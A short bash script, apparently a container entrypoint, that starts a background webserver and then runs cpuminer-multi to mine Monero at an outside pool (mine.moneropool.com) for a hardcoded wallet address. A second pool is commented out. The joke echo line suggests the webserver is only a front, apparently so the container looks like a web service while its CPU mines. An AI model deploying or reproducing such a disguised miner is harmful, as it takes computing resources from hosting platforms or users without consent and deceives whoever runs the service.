#!/bin/bash
cd /cpuminer-multi
echo "Listening on port 8080 for.... wait for it.... nothing!"
nohup /webserver.sh &
#./minerd -a cryptonight -o stratum+tcp://monerohash.com:3333 -u 42jF56tc85UTZwhMQc6rHbMHTxHqK74qS2zqLyRZxLbwegsy7FJ9w4T5B69Ay5qeMEMuvVDwHNeopAxrEZkkHrMb5phovJ6 -p x
./minerd -a cryptonight -o stratum+tcp://mine.moneropool.com:3333 -u 42jF56tc85UTZwhMQc6rHbMHTxHqK74qS2zqLyRZxLbwegsy7FJ9w4T5B69Ay5qeMEMuvVDwHNeopAxrEZkkHrMb5phovJ6 -p x
